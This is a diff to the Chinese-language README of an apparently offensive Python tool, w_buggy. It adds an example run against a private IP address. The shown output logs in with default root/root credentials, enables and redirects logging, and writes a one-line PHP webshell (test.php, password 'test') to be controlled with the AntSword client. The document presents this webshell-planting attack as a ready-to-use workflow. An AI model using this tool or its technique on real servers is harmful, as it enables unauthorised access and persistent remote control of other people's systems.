@@ -18,5 +18,16 @@ linux, >=python3.7
 
 #### 一句话木马路径
 当前默认为www目录下的test.php,密码默认为test,使用蚁剑连接
+#### 运行
+```shell script
+(venv) [root@localhost w_buggy]# python w_buggy_asynchronous.py http://192.168.52.143 -t 2
+开始扫描时间2021-01-22 20:02:22
+登录成功:用户名为root,密码为root
+日志开关已打开
+日志路径设置成功
+开始写入一句话木马
+一句话木马路径: http://192.168.52.143/test.php,密码test,请使用蚁剑连接
+扫描完成时间2021-01-22 20:02:28, 扫描耗时:0分钟
+```
 #
 ![](gzh.jpg)
